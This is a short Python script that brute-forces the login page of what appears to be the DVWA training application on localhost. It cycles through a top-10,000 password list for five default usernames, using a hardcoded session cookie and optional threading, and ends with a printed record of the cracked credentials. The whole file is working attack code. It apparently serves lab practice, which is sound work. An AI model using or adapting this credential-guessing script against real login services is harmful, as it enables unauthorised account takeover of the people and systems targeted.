import threading
import time

import requests

HOST = "127.0.0.1"
URL = f"http://{HOST}/vulnerabilities/brute/?"
PARALLEL_MODE = False  # rather faster:  12 c against 73 c
FILE_NAME = "files/10-million-password-list-top-10000"
PHPSESSID = "1m5puhnra2lui353bvo0ot8s51"
LOGINS = ("admin", "pablo", "1337", "smithy", "gordonb")

session = requests.Session()
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="PHPSESSID", value=PHPSESSID))
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="security", value="low"))


def func(session, login, password, row):
    response = session.get(url=f"{URL}username={login}&password={password}&Login=Login#")
    if "Welcome" in response.text:
        print(f"user: {login} password: {password} row: {row}")


with open(f"{FILE_NAME}.txt") as f:
    passwords = f.readlines()

start = time.time()

for login in LOGINS:
    for row, password in enumerate(passwords, start=1):
        password = password.strip()

        if PARALLEL_MODE:
            threading.Thread(target=func, args=(session, login, password, row)).start()
        else:
            response = session.get(url=f"{URL}username={login}&password={password}&Login=Login#")
            if "Welcome" in response.text:
                print(f"user: {login} password: {password} row: {row}")
                break

print(f"time: {round(time.time() - start, 2)} c")

"""
user: admin password: password row: 2
user: pablo password: letmein row: 16
user: 1337 password: charley row: 4037
user: smithy password: password row: 2
user: gordonb password: abc123 row: 13
time: 11.31 c
"""
